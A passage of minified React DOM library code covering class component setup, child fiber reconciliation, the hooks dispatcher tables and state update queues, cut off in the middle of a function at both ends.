  return typeof o == "object" && o !== null ? o = Ne(o) : (l = he(t) ? Pt : ie.current, r = t.contextTypes, o = (r = r != null) ? nn(e, l) : mt), t = new t(n, o), e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null, t.updater = fl, e.stateNode = t, t._reactInternals = e, r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = l, e.__reactInternalMemoizedMaskedChildContext = o), t
}

function Es(e, t, n, r) {
  e = t.state, typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r), typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && fl.enqueueReplaceState(t, t.state, null)
}

function Mo(e, t, n, r) {
  var l = e.stateNode;
  l.props = n, l.state = e.memoizedState, l.refs = ma, gi(e);
  var o = t.contextType;
  typeof o == "object" && o !== null ? l.context = Ne(o) : (o = he(t) ? Pt : ie.current, l.context = nn(e, o)), l.state = e.memoizedState, o = t.getDerivedStateFromProps, typeof o == "function" && (zo(e, t, o, n), l.state = e.memoizedState), typeof t.getDerivedStateFromProps == "function" || typeof l.getSnapshotBeforeUpdate == "function" || typeof l.UNSAFE_componentWillMount != "function" && typeof l.componentWillMount != "function" || (t = l.state, typeof l.componentWillMount == "function" && l.componentWillMount(), typeof l.UNSAFE_componentWillMount == "function" && l.UNSAFE_componentWillMount(), t !== l.state && fl.enqueueReplaceState(l, l.state, null), Xr(e, n, l, r), l.state = e.memoizedState), typeof l.componentDidMount == "function" && (e.flags |= 4194308)
}

function xn(e, t, n) {
  if (e = n.ref, e !== null && typeof e != "function" && typeof e != "object") {
      if (n._owner) {
          if (n = n._owner, n) {
              if (n.tag !== 1) throw Error(g(309));
              var r = n.stateNode
          }
          if (!r) throw Error(g(147, e));
          var l = r,
              o = "" + e;
          return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === o ? t.ref : (t = function (i) {
              var u = l.refs;
              u === ma && (u = l.refs = {}), i === null ? delete u[o] : u[o] = i
          }, t._stringRef = o, t)
      }
      if (typeof e != "string") throw Error(g(284));
      if (!n._owner) throw Error(g(290, e))
  }
  return e
}

function gr(e, t) {
  throw e = Object.prototype.toString.call(t), Error(g(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}

function Ps(e) {
  var t = e._init;
  return t(e._payload)
}

function ya(e) {
  function t(f, c) {
      if (e) {
          var p = f.deletions;
          p === null ? (f.deletions = [c], f.flags |= 16) : p.push(c)
      }
  }

  function n(f, c) {
      if (!e) return null;
      for (; c !== null;) t(f, c), c = c.sibling;
      return null
  }

  function r(f, c) {
      for (f = new Map; c !== null;) c.key !== null ? f.set(c.key, c) : f.set(c.index, c), c = c.sibling;
      return f
  }

  function l(f, c) {
      return f = pt(f, c), f.index = 0, f.sibling = null, f
  }

  function o(f, c, p) {
      return f.index = p, e ? (p = f.alternate, p !== null ? (p = p.index, p < c ? (f.flags |= 2, c) : p) : (f.flags |= 2, c)) : (f.flags |= 1048576, c)
  }

  function i(f) {
      return e && f.alternate === null && (f.flags |= 2), f
  }

  function u(f, c, p, y) {
      return c === null || c.tag !== 6 ? (c = Gl(p, f.mode, y), c.return = f, c) : (c = l(c, p), c.return = f, c)
  }

  function a(f, c, p, y) {
      var S = p.type;
      return S === Ht ? v(f, c, p.props.children, y, p.key) : c !== null && (c.elementType === S || typeof S == "object" && S !== null && S.$$typeof === Je && Ps(S) === c.type) ? (y = l(c, p.props), y.ref = xn(f, c, p), y.return = f, y) : (y = Ir(p.type, p.key, p.props, null, f.mode, y), y.ref = xn(f, c, p), y.return = f, y)
  }

  function d(f, c, p, y) {
      return c === null || c.tag !== 4 || c.stateNode.containerInfo !== p.containerInfo || c.stateNode.implementation !== p.implementation ? (c = Xl(p, f.mode, y), c.return = f, c) : (c = l(c, p.children || []), c.return = f, c)
  }

  function v(f, c, p, y, S) {
      return c === null || c.tag !== 7 ? (c = Et(p, f.mode, y, S), c.return = f, c) : (c = l(c, p), c.return = f, c)
  }

  function m(f, c, p) {
      if (typeof c == "string" && c !== "" || typeof c == "number") return c = Gl("" + c, f.mode, p), c.return = f, c;
      if (typeof c == "object" && c !== null) {
          switch (c.$$typeof) {
          case sr:
              return p = Ir(c.type, c.key, c.props, null, f.mode, p), p.ref = xn(f, null, c), p.return = f, p;
          case Ot:
              return c = Xl(c, f.mode, p), c.return = f, c;
          case Je:
              var y = c._init;
              return m(f, y(c._payload), p)
          }
          if (Sn(c) || hn(c)) return c = Et(c, f.mode, p, null), c.return = f, c;
          gr(f, c)
      }
      return null
  }

  function h(f, c, p, y) {
      var S = c !== null ? c.key : null;
      if (typeof p == "string" && p !== "" || typeof p == "number") return S !== null ? null : u(f, c, "" + p, y);
      if (typeof p == "object" && p !== null) {
          switch (p.$$typeof) {
          case sr:
              return p.key === S ? a(f, c, p, y) : null;
          case Ot:
              return p.key === S ? d(f, c, p, y) : null;
          case Je:
              return S = p._init, h(f, c, S(p._payload), y)
          }
          if (Sn(p) || hn(p)) return S !== null ? null : v(f, c, p, y, null);
          gr(f, p)
      }
      return null
  }

  function x(f, c, p, y, S) {
      if (typeof y == "string" && y !== "" || typeof y == "number") return f = f.get(p) || null, u(c, f, "" + y, S);
      if (typeof y == "object" && y !== null) {
          switch (y.$$typeof) {
          case sr:
              return f = f.get(y.key === null ? p : y.key) || null, a(c, f, y, S);
          case Ot:
              return f = f.get(y.key === null ? p : y.key) || null, d(c, f, y, S);
          case Je:
              var _ = y._init;
              return x(f, c, p, _(y._payload), S)
          }
          if (Sn(y) || hn(y)) return f = f.get(p) || null, v(c, f, y, S, null);
          gr(c, y)
      }
      return null
  }

  function w(f, c, p, y) {
      for (var S = null, _ = null, N = c, E = c = 0, q = null; N !== null && E < p.length; E++) {
          N.index > E ? (q = N, N = null) : q = N.sibling;
          var L = h(f, N, p[E], y);
          if (L === null) {
              N === null && (N = q);
              break
          }
          e && N && L.alternate === null && t(f, N), c = o(L, c, E), _ === null ? S = L : _.sibling = L, _ = L, N = q
      }
      if (E === p.length) return n(f, N), V && kt(f, E), S;
      if (N === null) {
          for (; E < p.length; E++) N = m(f, p[E], y), N !== null && (c = o(N, c, E), _ === null ? S = N : _.sibling = N, _ = N);
          return V && kt(f, E), S
      }
      for (N = r(f, N); E < p.length; E++) q = x(N, f, E, p[E], y), q !== null && (e && q.alternate !== null && N.delete(q.key === null ? E : q.key), c = o(q, c, E), _ === null ? S = q : _.sibling = q, _ = q);
      return e && N.forEach(function (Pe) {
          return t(f, Pe)
      }), V && kt(f, E), S
  }

  function k(f, c, p, y) {
      var S = hn(p);
      if (typeof S != "function") throw Error(g(150));
      if (p = S.call(p), p == null) throw Error(g(151));
      for (var _ = S = null, N = c, E = c = 0, q = null, L = p.next(); N !== null && !L.done; E++, L = p.next()) {
          N.index > E ? (q = N, N = null) : q = N.sibling;
          var Pe = h(f, N, L.value, y);
          if (Pe === null) {
              N === null && (N = q);
              break
          }
          e && N && Pe.alternate === null && t(f, N), c = o(Pe, c, E), _ === null ? S = Pe : _.sibling = Pe, _ = Pe, N = q
      }
      if (L.done) return n(f, N), V && kt(f, E), S;
      if (N === null) {
          for (; !L.done; E++, L = p.next()) L = m(f, L.value, y), L !== null && (c = o(L, c, E), _ === null ? S = L : _.sibling = L, _ = L);
          return V && kt(f, E), S
      }
      for (N = r(f, N); !L.done; E++, L = p.next()) L = x(N, f, E, L.value, y), L !== null && (e && L.alternate !== null && N.delete(L.key === null ? E : L.key), c = o(L, c, E), _ === null ? S = L : _.sibling = L, _ = L);
      return e && N.forEach(function (fn) {
          return t(f, fn)
      }), V && kt(f, E), S
  }

  function D(f, c, p, y) {
      if (typeof p == "object" && p !== null && p.type === Ht && p.key === null && (p = p.props.children), typeof p == "object" && p !== null) {
          switch (p.$$typeof) {
          case sr:
              e: {
                  for (var S = p.key, _ = c; _ !== null;) {
                      if (_.key === S) {
                          if (S = p.type, S === Ht) {
                              if (_.tag === 7) {
                                  n(f, _.sibling), c = l(_, p.props.children), c.return = f, f = c;
                                  break e
                              }
                          } else if (_.elementType === S || typeof S == "object" && S !== null && S.$$typeof === Je && Ps(S) === _.type) {
                              n(f, _.sibling), c = l(_, p.props), c.ref = xn(f, _, p), c.return = f, f = c;
                              break e
                          }
                          n(f, _);
                          break
                      } else t(f, _);
                      _ = _.sibling
                  }
                  p.type === Ht ? (c = Et(p.props.children, f.mode, y, p.key), c.return = f, f = c) : (y = Ir(p.type, p.key, p.props, null, f.mode, y), y.ref = xn(f, c, p), y.return = f, f = y)
              }
              return i(f);
          case Ot:
              e: {
                  for (_ = p.key; c !== null;) {
                      if (c.key === _)
                          if (c.tag === 4 && c.stateNode.containerInfo === p.containerInfo && c.stateNode.implementation === p.implementation) {
                              n(f, c.sibling), c = l(c, p.children || []), c.return = f, f = c;
                              break e
                          } else {
                              n(f, c);
                              break
                          }
                      else t(f, c);
                      c = c.sibling
                  }
                  c = Xl(p, f.mode, y),
                  c.return = f,
                  f = c
              }
              return i(f);
          case Je:
              return _ = p._init, D(f, c, _(p._payload), y)
          }
          if (Sn(p)) return w(f, c, p, y);
          if (hn(p)) return k(f, c, p, y);
          gr(f, p)
      }
      return typeof p == "string" && p !== "" || typeof p == "number" ? (p = "" + p, c !== null && c.tag === 6 ? (n(f, c.sibling), c = l(c, p), c.return = f, f = c) : (n(f, c), c = Gl(p, f.mode, y), c.return = f, f = c), i(f)) : n(f, c)
  }
  return D
}
var ln = ya(!0),
  ga = ya(!1),
  rr = {},
  Ve = yt(rr),
  Qn = yt(rr),
  Zn = yt(rr);

function _t(e) {
  if (e === rr) throw Error(g(174));
  return e
}

function xi(e, t) {
  switch (A(Zn, t), A(Qn, e), A(Ve, rr), e = t.nodeType, e) {
  case 9:
  case 11:
      t = (t = t.documentElement) ? t.namespaceURI : so(null, "");
      break;
  default:
      e = e === 8 ? t.parentNode : t, t = e.namespaceURI || null, e = e.tagName, t = so(t, e)
  }
  F(Ve), A(Ve, t)
}

function on() {
  F(Ve), F(Qn), F(Zn)
}

function xa(e) {
  _t(Zn.current);
  var t = _t(Ve.current),
      n = so(t, e.type);
  t !== n && (A(Qn, e), A(Ve, n))
}

function wi(e) {
  Qn.current === e && (F(Ve), F(Qn))
}
var U = yt(0);

function Yr(e) {
  for (var t = e; t !== null;) {
      if (t.tag === 13) {
          var n = t.memoizedState;
          if (n !== null && (n = n.dehydrated, n === null || n.data === "$?" || n.data === "$!")) return t
      } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
          if (t.flags & 128) return t
      } else if (t.child !== null) {
          t.child.return = t, t = t.child;
          continue
      }
      if (t === e) break;
      for (; t.sibling === null;) {
          if (t.return === null || t.return === e) return null;
          t = t.return
      }
      t.sibling.return = t.return, t = t.sibling
  }
  return null
}
var $l = [];

function ki() {
  for (var e = 0; e < $l.length; e++) $l[e]._workInProgressVersionPrimary = null;
  $l.length = 0
}
var zr = Xe.ReactCurrentDispatcher,
  Wl = Xe.ReactCurrentBatchConfig,
  Mt = 0,
  B = null,
  G = null,
  J = null,
  Jr = !1,
  Ln = !1,
  Kn = 0,
  md = 0;

function re() {
  throw Error(g(321))
}

function ji(e, t) {
  if (t === null) return !1;
  for (var n = 0; n < t.length && n < e.length; n++)
      if (!De(e[n], t[n])) return !1;
  return !0
}

function Si(e, t, n, r, l, o) {
  if (Mt = o, B = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, zr.current = e === null || e.memoizedState === null ? xd : wd, e = n(r, l), Ln) {
      o = 0;
      do {
          if (Ln = !1, Kn = 0, 25 <= o) throw Error(g(301));
          o += 1, J = G = null, t.updateQueue = null, zr.current = kd, e = n(r, l)
      } while (Ln)
  }
  if (zr.current = br, t = G !== null && G.next !== null, Mt = 0, J = G = B = null, Jr = !1, t) throw Error(g(300));
  return e
}

function Ci() {
  var e = Kn !== 0;
  return Kn = 0, e
}

function Oe() {
  var e = {
      memoizedState: null,
      baseState: null,
      baseQueue: null,
      queue: null,
      next: null
  };
  return J === null ? B.memoizedState = J = e : J = J.next = e, J
}

function Ee() {
  if (G === null) {
      var e = B.alternate;
      e = e !== null ? e.memoizedState : null
  } else e = G.next;
  var t = J === null ? B.memoizedState : J.next;
  if (t !== null) J = t, G = e;
  else {
      if (e === null) throw Error(g(310));
      G = e, e = {
          memoizedState: G.memoizedState,
          baseState: G.baseState,
          baseQueue: G.baseQueue,
          queue: G.queue,
          next: null
      }, J === null ? B.memoizedState = J = e : J = J.next = e
  }
  return J
}

function Gn(e, t) {
  return typeof t == "function" ? t(e) : t
}

function ql(e) {
  var t = Ee(),
      n = t.queue;
  if (n === null) throw Error(g(311));
  n.lastRenderedReducer = e;
  var r = G,
      l = r.baseQueue,
      o = n.pending;
  if (o !== null) {
      if (l !== null) {
          var i = l.next;
          l.next = o.next, o.next = i
      }
      r.baseQueue = l = o, n.pending = null
  }
  if (l !== null) {
      o = l.next, r = r.baseState;
      var u = i = null,
          a = null,
          d = o;
      do {
          var v = d.lane;
          if ((Mt & v) === v) a !== null && (a = a.next = {
              lane: 0,
              action: d.action,
              hasEagerState: d.hasEagerState,
              eagerState: d.eagerState,
              next: null
          }), r = d.hasEagerState ? d.eagerState : e(r, d.action);
          else {
              var m = {
                  lane: v,
                  action: d.action,
                  hasEagerState: d.hasEagerState,
                  eagerState: d.eagerState,
                  next: null
              };
              a === null ? (u = a = m, i = r) : a = a.next = m, B.lanes |= v, Lt |= v
          }
          d = d.next
      } while (d !== null && d !== o);
      a === null ? i = r : a.next = u, De(r, t.memoizedState) || (fe = !0), t.memoizedState = r, t.baseState = i, t.baseQueue = a, n.lastRenderedState = r
  }
  if (e = n.interleaved, e !== null) {
      l = e;
      do o = l.lane, B.lanes |= o, Lt |= o, l = l.next; while (l !== e)
  } else l === null && (n.lanes = 0);
  return [t.memoizedState, n.dispatch]
}

function Ql(e) {
  var t = Ee(),
      n = t.queue;
  if (n === null) throw Error(g(311));
  n.lastRenderedReducer = e;
  var r = n.dispatch,
      l = n.pending,
      o = t.memoizedState;
  if (l !== null) {
      n.pending = null;
      var i = l = l.next;
      do o = e(o, i.action), i = i.next; while (i !== l);
      De(o, t.memoizedState) || (fe = !0), t.memoizedState = o, t.baseQueue === null && (t.baseState = o), n.lastRenderedState = o
  }
  return [o, r]
}

function wa() {}

function ka(e, t) {
  var n = B,
      r = Ee(),
      l = t(),
      o = !De(r.memoizedState, l);
  if (o && (r.memoizedState = l, fe = !0), r = r.queue, _i(Ca.bind(null, n, r, e), [e]), r.getSnapshot !== t || o || J !== null && J.memoizedState.tag & 1) {
      if (n.flags |= 2048, Xn(9, Sa.bind(null, n, r, l, t), void 0, null), b === null) throw Error(g(349));
      Mt & 30 || ja(n, t, l)
  }
  return l
}

function ja(e, t, n) {
  e.flags |= 16384, e = {
      getSnapshot: t,
      value: n
  }, t = B.updateQueue, t === null ? (t = {
      lastEffect: null,
      stores: null
  }, B.updateQueue = t, t.stores = [e]) : (n = t.stores, n === null ? t.stores = [e] : n.push(e))
}

function Sa(e, t, n, r) {
  t.value = n, t.getSnapshot = r, _a(t) && Na(e)
}

function Ca(e, t, n) {
  return n(function () {
      _a(t) && Na(e)
  })
}

function _a(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
      var n = t();
      return !De(e, n)
  } catch {
      return !0
  }
}

function Na(e) {
  var t = Ke(e, 1);
  t !== null && Ie(t, e, 1, -1)
}

function zs(e) {
  var t = Oe();
  return typeof e == "function" && (e = e()), t.memoizedState = t.baseState = e, e = {
      pending: null,
      interleaved: null,
      lanes: 0,
      dispatch: null,
      lastRenderedReducer: Gn,
      lastRenderedState: e
  }, t.queue = e, e = e.dispatch = gd.bind(null, B, e), [t.memoizedState, e]
}

function Xn(e, t, n, r) {
  return e = {
      tag: e,
      create: t,
      destroy: n,
      deps: r,
      next: null
  }, t = B.updateQueue, t === null ? (t = {
      lastEffect: null,
      stores: null
  }, B.updateQueue = t, t.lastEffect = e.next = e) : (n = t.lastEffect, n === null ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e)), e
}

function Ea() {
  return Ee().memoizedState
}

function Mr(e, t, n, r) {
  var l = Oe();
  B.flags |= e, l.memoizedState = Xn(1 | t, n, void 0, r === void 0 ? null : r)
}

function pl(e, t, n, r) {
  var l = Ee();
  r = r === void 0 ? null : r;
  var o = void 0;
  if (G !== null) {
      var i = G.memoizedState;
      if (o = i.destroy, r !== null && ji(r, i.deps)) {
          l.memoizedState = Xn(t, n, o, r);
          return
      }
  }
  B.flags |= e, l.memoizedState = Xn(1 | t, n, o, r)
}

function Ms(e, t) {
  return Mr(8390656, 8, e, t)
}

function _i(e, t) {
  return pl(2048, 8, e, t)
}

function Pa(e, t) {
  return pl(4, 2, e, t)
}

function za(e, t) {
  return pl(4, 4, e, t)
}

function Ma(e, t) {
  if (typeof t == "function") return e = e(), t(e),
      function () {
          t(null)
      };
  if (t != null) return e = e(), t.current = e,
      function () {
          t.current = null
      }
}

function La(e, t, n) {
  return n = n != null ? n.concat([e]) : null, pl(4, 4, Ma.bind(null, t, e), n)
}

function Ni() {}

function Ta(e, t) {
  var n = Ee();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && ji(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e)
}

function Ra(e, t) {
  var n = Ee();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && ji(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e)
}

function Ia(e, t, n) {
  return Mt & 21 ? (De(n, t) || (n = Ou(), B.lanes |= n, Lt |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, fe = !0), e.memoizedState = n)
}

function vd(e, t) {
  var n = I;
  I = n !== 0 && 4 > n ? n : 4, e(!0);
  var r = Wl.transition;
  Wl.transition = {};
  try {
      e(!1), t()
  } finally {
      I = n, Wl.transition = r
  }
}

function Da() {
  return Ee().memoizedState
}

function yd(e, t, n) {
  var r = ft(e);
  if (n = {
          lane: r,
          action: n,
          hasEagerState: !1,
          eagerState: null,
          next: null
      }, Aa(e)) Oa(t, n);
  else if (n = pa(e, t, n, r), n !== null) {
      var l = ue();
      Ie(n, e, r, l), Ha(n, t, r)
  }
}

function gd(e, t, n) {
  var r = ft(e),
      l = {
          lane: r,
          action: n,
          hasEagerState: !1,
          eagerState: null,
          next: null
      };
  if (Aa(e)) Oa(t, l);
  else {
      var o = e.alternate;
      if (e.lanes === 0 && (o === null || o.lanes === 0) && (o = t.lastRenderedReducer, o !== null)) try {
          var i = t.lastRenderedState,
              u = o(i, n);
          if (l.hasEagerState = !0, l.eagerState = u, De(u, i)) {
              var a = t.interleaved;
              a === null ? (l.next = l, yi(t)) : (l.next = a.next, a.next = l), t.interleaved = l;
              return
          }
      } catch {} finally {}
      n = pa(e, t, l, r), n !== null && (l = ue(), Ie(n, e, r, l), Ha(n, t, r))
  }
}

function Aa(e) {
  var t = e.alternate;
  return e === B || t !== null && t === B
}

function Oa(e, t) {
  Ln = Jr = !0;
  var n = e.pending;
  n === null ? t.next = t : (t.next = n.next, n.next = t), e.pending = t
}

function Ha(e, t, n) {
  if (n & 4194240) {
      var r = t.lanes;
      r &= e.pendingLanes, n |= r, t.lanes = n, ri(e, n)
  }
}
var br = {
      readContext: Ne,
      useCallback: re,
      useContext: re,
      useEffect: re,
      useImperativeHandle: re,
      useInsertionEffect: re,
      useLayoutEffect: re,
      useMemo: re,
      useReducer: re,
      useRef: re,
      useState: re,
      useDebugValue: re,
      useDeferredValue: re,
      useTransition: re,
      useMutableSource: re,
      useSyncExternalStore: re,
      useId: re,
      unstable_isNewReconciler: !1
  },
  xd = {
      readContext: Ne,
      useCallback: function (e, t) {
          return Oe().memoizedState = [e, t === void 0 ? null : t], e
      },
      useContext: Ne,
      useEffect: Ms,
      useImperativeHandle: function (e, t, n) {
          return n = n != null ? n.concat([e]) : null, Mr(4194308, 4, Ma.bind(null, t, e), n)
      },
      useLayoutEffect: function (e, t) {
          return Mr(4194308, 4, e, t)
      },
      useInsertionEffect: function (e, t) {
          return Mr(4, 2, e, t)
      },
      useMemo: function (e, t) {
          var n = Oe();
          return t = t === void 0 ? null : t, e = e(), n.memoizedState = [e, t], e
      },
      useReducer: function (e, t, n) {
          var r = Oe();
          return t = n !== void 0 ? n(t) : t, r.memoizedState = r.baseState = t, e = {
              pending: null,
              interleaved: null,
              lanes: 0,
              dispatch: null,
              lastRenderedReducer: e,
              lastRenderedState: t
          }, r.queue = e, e = e.dispatch = yd.bind(null, B, e), [r.memoizedState, e]
      },
      useRef: function (e) {
          var t = Oe();
          return e = {
              current: e
          }, t.memoizedState = e
      },
      useState: zs,
      useDebugValue: Ni,
      useDeferredValue: function (e) {
          return Oe().memoizedState = e
      },
      useTransition: function () {
          var e = zs(!1),
              t = e[0];
          return e = vd.bind(null, e[1]), Oe().memoizedState = e, [t, e]
      },
      useMutableSource: function () {},
      useSyncExternalStore: function (e, t, n) {
          var r = B,
              l = Oe();
          if (V) {
              if (n === void 0) throw Error(g(407));
              n = n()
          } else {
              if (n = t(), b === null) throw Error(g(349));
              Mt & 30 || ja(r, t, n)
          }
          l.memoizedState = n;
          var o = {
              value: n,
              getSnapshot: t
          };
          return l.queue = o, Ms(Ca.bind(null, r, o, e), [e]), r.flags |= 2048, Xn(9, Sa.bind(null, r, o, n, t), void 0, null), n
      },
      useId: function () {
          var e = Oe(),
              t = b.identifierPrefix;
          if (V) {
              var n = We,
                  r = $e;
              n = (r & ~(1 << 32 - Re(r) - 1)).toString(32) + n, t = ":" + t + "R" + n, n = Kn++, 0 < n && (t += "H" + n.toString(32)), t += ":"
          } else n = md++, t = ":" + t + "r" + n.toString(32) + ":";
          return e.memoizedState = t
      },
      unstable_isNewReconciler: !1
  },
  wd = {
      readContext: Ne,
      useCallback: Ta,
      useContext: Ne,
      useEffect: _i,
      useImperativeHandle: La,
      useInsertionEffect: Pa,
      useLayoutEffect: za,
      useMemo: Ra,
      useReducer: ql,
      useRef: Ea,
      useState: function () {
          return ql(Gn)
      },
      useDebugValue: Ni,
      useDeferredValue: function (e) {
          var t = Ee();
          return Ia(t, G.memoizedState, e)
      },
      useTransition: function () {
          var e = ql(Gn)[0],
              t = Ee().memoizedState;
          return [e, t]
      },
      useMutableSource: wa,
      useSyncExternalStore: ka,
      useId: Da,
      unstable_isNewReconciler: !1
  },
  kd = {
      readContext: Ne,
      useCallback: Ta,
      useContext: Ne,
      useEffect: _i,
      useImperativeHandle: La,
      useInsertionEffect: Pa,
      useLayoutEffect: za,
      useMemo: Ra,
      useReducer: Ql,
      useRef: Ea,
      useState: function () {
          return Ql(Gn)
      },
      useDebugValue: Ni,
      useDeferredValue: function (e) {
          var t = Ee();
          return G === null ? t.memoizedState = e : Ia(t, G.memoizedState, e)
      },
      useTransition: function () {
          var e = Ql(Gn)[0],
              t = Ee().memoizedState;
          return [e, t]
      },
      useMutableSource: wa,
      useSyncExternalStore: ka,
      useId: Da,
      unstable_isNewReconciler: !1
  };

function sn(e, t) {
  try {
      var n = "",
          r = t;
      do n += Gc(r), r = r.return; while (r);
      var l = n
  } catch (o) {
      l = `
Error generating stack: ` + o.message + `
` + o.stack
  }
  return {
      value: e,
      source: t,
      stack: l,
      digest: null
  }
}

function Zl(e, t, n) {
  return {
      value: e,
      source: null,
      stack: n ?? null,
      digest: t ?? null
  }
}

function Lo(e, t) {
  try {
      console.error(t.value)
  } catch (n) {
      setTimeout(function () {
          throw n
      })
  }
}
var jd = typeof WeakMap == "function" ? WeakMap : Map;

function Fa(e, t, n) {
  n = qe(-1, n), n.tag = 3, n.payload = {
      element: null
  };
  var r = t.value;
  return n.callback = function () {
      tl || (tl = !0, Uo = r), Lo(e, t)
  }, n
}

function Va(e, t, n) {
  n = qe(-1, n), n.tag = 3;
  var r = e.type.getDerivedStateFromError;
  if (typeof r == "function") {
      var l = t.value;
      n.payload = function () {
          return r(l)
      }, n.callback = function () {
          Lo(e, t)
      }
  }
  var o = e.stateNode;
  return o !== null && typeof o.componentDidCatch == "function" && (n.callback = function () {
      Lo(e, t), typeof r != "function" && (dt === null ? dt = new Set([this]) : dt.add(this));
      var i = t.stack;
      this.componentDidCatch(t.value, {
          componentStack: i !== null ? i : ""
      })
  }), n
}

function Ls(e, t, n) {
  var r = e.pingCache;
  if (r === null) {
      r = e.pingCache = new jd;
      var l = new Set;
      r.set(t, l)
  } else l = r.get(t), l === void 0 && (l = new Set, r.set(t, l));
  l.has(n) || (l.add(n), e = Ad.bind(null, e, t, n), t.then(e, e))
}

function Ts(e) {
  do {
      var t;
      if ((t = e.tag === 13) && (t = e.memoizedState, t = t !== null ? t.dehydrated !== null : !0), t) return e;
      e = e.return
  } while (e !== null);
  return null
}

function Rs(e, t, n, r, l) {
  return e.mode & 1 ? (e.flags |= 65536, e.lanes = l, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = qe(-1, 1), t.tag = 2, ct(n, t, 1))), n.lanes |= 1), e)
}
var Sd = Xe.ReactCurrentOwner,
  fe = !1;

function se(e, t, n, r) {
  t.child = e === null ? ga(t, null, n, r) : ln(t, e.child, n, r)
}

function Is(e, t, n, r, l) {
  n = n.render;
  var o = t.ref;
  return bt(t, l), r = Si(e, t, n, r, o, l), n = Ci(), e !== null && !fe ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~l, Ge(e, t, l)) : (V && n && di(t), t.flags |= 1, se(e, t, r, l), t.child)
}

function Ds(e, t, n, r, l) {
  if (e === null) {
      var o = n.type;
      return typeof o == "function" && !Ii(o) && o.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15, t.type = o, Ua(e, t, o, r, l)) : (e = Ir(n.type, null, r, t, t.mode, l), e.ref = t.ref, e.return = t, t.child = e)
  }
  if (o = e.child, !(e.lanes & l)) {
      var i = o.memoizedProps;
      if (n = n.compare, n = n !== null ? n : Bn, n(i, r) && e.ref === t.ref) return Ge(e, t, l)
  }
  return t.flags |= 1, e = pt(o, r), e.ref = t.ref, e.return = t, t.child = e
}

function Ua(e, t, n, r, l) {
  if (e !== null) {
      var o = e.memoizedProps;
      if (Bn(o, r) && e.ref === t.ref)
          if (fe = !1, t.pendingProps = r = o, (e.lanes & l) !== 0) e.flags & 131072 && (fe = !0);
          else return t.lanes = e.lanes, Ge(e, t, l)
  }
  return To(e, t, n, r, l)
}

function Ba(e, t, n) {
  var r = t.pendingProps,
      l = r.children,
      o = e !== null ? e.memoizedState : null;
  if (r.mode === "hidden")
      if (!(t.mode & 1)) t.memoizedState = {
          baseLanes: 0,
          cachePool: null,
          transitions: null
      }, A(Kt, ve), ve |= n;
      else {
          if (!(n & 1073741824)) return e = o !== null ? o.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
              baseLanes: e,
              cachePool: null,
              transitions: null
          }, t.updateQueue = null, A(Kt, ve), ve |= e, null;
          t.memoizedState = {
              baseLanes: 0,
              cachePool: null,
              transitions: null
          }, r = o !== null ? o.baseLanes : n, A(Kt, ve), ve |= r
      }
  else o !== null ? (r = o.baseLanes | n, t.memoizedState = null) : r = n, A(Kt, ve), ve |= r;
  return se(e, t, l, n), t.child
}

function $a(e, t) {
  var n = t.ref;
  (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152)
}

function To(e, t, n, r, l) {
  var o = he(n) ? Pt : ie.current;
  return o = nn(t, o), bt(t, l), n = Si(e, t, n, r, o, l), r = Ci(), e !== null && !fe ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~l, Ge(e, t, l)) : (V && r && di(t), t.flags |= 1, se(e, t, n, l), t.child)
}

function As(e, t, n, r, l) {
  if (he(n)) {
      var o = !0;
      qr(t)
  } else o = !1;
  if (bt(t, l), t.stateNode === null) Lr(e, t), va(t, n, r), Mo(t, n, r, l), r = !0;
  else if (e === null) {
      var i = t.stateNode,
          u = t.memoizedProps;
      i.props = u;
      var a = i.context,
          d = n.contextType;
      typeof d == "object" && d !== null ? d = Ne(d) : (d = he(n) ? Pt : ie.current, d = nn(t, d));
      var v = n.getDerivedStateFromProps,
          m = typeof v == "function" || typeof i.getSnapshotBeforeUpdate == "function";
      m || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (u !== r || a !== d) && Es(t, i, r, d), be = !1;
      var h = t.memoizedState;
      i.state = h, Xr(t, r, i, l), a = t.memoizedState, u !== r || h !== a || pe.current || be ? (typeof v == "function" && (zo(t, n, v, r), a = t.memoizedState), (u = be || Ns(t, n, u, r, h, a, d)) ? (m || typeof i.UNSAFE_componentWillMount != "function" && typeof i.componentWillMount != "function" || (typeof i.componentWillMount == "function" && i.componentWillMount(), typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount()), typeof i.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = a), i.props = r, i.state = a, i.context = d, r = u) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
  } else {
      i = t.stateNode, ha(e, t), u = t.memoizedProps, d = t.type === t.elementType ? u : Me(t.type, u), i.props = d, m = t.pendingProps, h = i.context, a = n.contextType, typeof a == "object" && a !== null ? a = Ne(a) : (a = he(n) ? Pt : ie.current, a = nn(t, a));
      var x = n.getDerivedStateFromProps;
